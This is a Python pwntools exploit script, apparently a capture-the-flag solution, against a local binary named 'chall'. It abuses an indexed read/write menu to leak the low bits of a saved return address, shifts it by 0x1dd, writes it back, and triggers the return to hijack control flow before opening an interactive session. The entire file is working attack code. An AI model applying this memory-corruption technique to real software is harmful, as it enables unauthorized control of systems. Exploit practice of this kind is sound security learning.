#!/usr/bin/env python3
from pwn import *

def read_int(p, idx):
    p.recvuntil(b': ')
    p.send(b'R\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    return int(p.recvline().decode().strip().replace('Value: ', '')) & 0xFFFFFFFF

def write_int(p, idx, val):
    p.recvuntil(b': ')
    p.send(b'W\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b': ')
    p.send(str(val).encode() + b'\n')
   
def read_ret_lo(p):
    return read_int(p, 14)

def write_ret_lo(p, val):
    write_int(p, 14, val)

def trigger_quit(p):
    p.recvuntil(b': ')
    p.send(b'Q\n')
    p.interactive()

p = process('./chall')
ret_addr_lo = read_ret_lo(p)
log.info(f'Concluded return address low part: 0x{ret_addr_lo:02x}')
ret_addr_lo -= 0x1dd
write_ret_lo(p, ret_addr_lo)
log.info(f'Written new return address low part: 0x{ret_addr_lo:02x}')
log.info('Triggering')
trigger_quit(p)

